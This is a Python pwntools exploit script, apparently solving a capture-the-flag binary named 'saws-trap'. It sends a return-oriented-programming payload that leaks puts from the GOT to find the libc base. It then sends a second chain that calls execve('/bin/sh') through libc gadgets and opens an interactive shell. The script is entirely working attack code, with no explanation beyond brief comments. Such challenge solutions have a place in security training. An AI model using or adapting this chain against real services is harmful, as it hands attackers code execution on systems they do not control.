#!/usr/bin/env python3

from pwn import *

exe = ELF("./saws-trap")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = ["urxvt", "-e", "sh", "-c"]


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.DEBUG:
			gdb.attach(r)
	else:
		r = remote("127.0.0.1", 9999)

	return r


def main():
	r = conn()
	#gdb.attach(r, gdbscript='''
	#	b *(main+54)
	#	''')


	# good luck pwning :)
	buf = fit({
		0x48: p64(0x40122b), # p rdi
		0x50: exe.got["puts"],
		0x58: exe.symbols["puts"], 
		0x60: exe.symbols["main"],
	})

	r.sendline(buf)

	# get libc info leak
	r.recvline()
	r.recvline()
	leak = int.from_bytes(r.recvline()[:-1], byteorder='little')

	libc.address = leak - libc.symbols["puts"]
	print(hex(leak))
	print(hex(libc.address))

	# find gadgets
	p_rsi = libc.address + 0x2be51
	p_rdx = libc.address + 0x796a2
	p_rax = libc.address + 0x45eb0
	syscall = libc.address + 0x91316

	# create execve ropchain
	buf = fit({
		0x48: p64(0x40122b), 
		0x50: next(libc.search(b"/bin/sh\0")),
		0x58: p_rsi,
		0x60: 0,
		0x68: p_rdx,
		0x70: 0,
		0x78: p_rax,
		0x80: 0x3b,
		0x88: syscall,
	})

	r.sendline(buf)


	r.interactive()


if __name__ == "__main__":
	main()
